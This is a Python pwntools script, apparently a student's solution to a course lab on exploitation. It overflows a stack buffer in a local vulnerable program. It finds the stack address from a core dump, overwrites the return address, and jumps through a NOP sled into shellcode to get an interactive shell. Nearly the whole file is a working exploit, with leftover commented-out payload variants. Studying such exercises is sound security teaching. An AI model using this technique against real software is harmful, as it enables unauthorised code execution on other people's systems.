from pwn import *

from shellcode import get_shellcode

# =============================================
# ========= write your code below  ============
# =============================================

''' returns the payload for the attack 
    given the path to the vulnerable binary
    and the shellcode from get_shellcode in shellcode.py
    (string, string) -> (string)
'''    
def craft_payload(path_to_vuln_prgm, shellcode):
    # write cycle file
    payload = cyclic(20 + 4)
    # file = open('payload.txt', 'w')
    # file.write(payload)
    # file.close()

    # get small buffer thing
    p = process([path_to_vuln_prgm, payload])
    p.wait_for_close()
    core = Coredump('./core')
    sbaddr = core.esp
    print 'sbaddr: ', sbaddr
    sbaddr = p32(sbaddr+100+64)

    # 12 byte buffer construction
    # ret = '\x90'*12 + laddr + 'a'*(24 - len(lbaddr) - 12) + sbaddr
    reta = 'a'*24 + sbaddr
    # 1000 byte construction
    ret = reta + '\x90'*128 + shellcode + 'a'*(1016-128-len(reta)-len(shellcode))
    #ret += 'a'*(1000-len(shellcode)-100) + sbaddr

    # ret = 'a'*11 + '\n' + 'x90'*10 + shellcode + 'a'*(20 - len(shellcode) - 11) + buffer_address + '\n' + 'a'* 1000
    return ret

# =============================================
# ===== do not modify the code below ==========
# =============================================

def execute_interactive(path_to_vuln_prgm, payload):
    filename = '/home/mallory/payload.txt'
    open(filename, 'w').write(payload)
    p = process([path_to_vuln_prgm, filename])
    p.interactive()
    
def execute_non_interactive(path_to_vuln_prgm, payload):
    filename = '/home/mallory/payload.txt'
    open(filename, 'w').write(payload)
    p = process([path_to_vuln_prgm, filename])
    print p.recvall()

def run(path_to_vuln_prgm):
    interactive, shellcode = get_shellcode()
    payload = craft_payload(path_to_vuln_prgm, shellcode)
    if interactive: 
       execute_interactive(path_to_vuln_prgm, payload)
    else:
       execute_non_interactive(path_to_vuln_prgm, payload)
    
if __name__ == "__main__":
   import os, sys, getopt
   def usage():
        print ('Usage:    ' + os.path.basename(__file__) + ' path_to_vuln_prgm')
        sys.exit(2)
   try:
      opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
   except getopt.GetoptError as err:
      print(err)
      usage()
   # extract parameters
   path_to_vuln_prgm = args[0] if len(args) > 0 else None
   for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
   # check arguments
   if (path_to_vuln_prgm is None):
       print('path_to_vuln_prgm is missing\n')
       usage()
   # run the command
   run(path_to_vuln_prgm)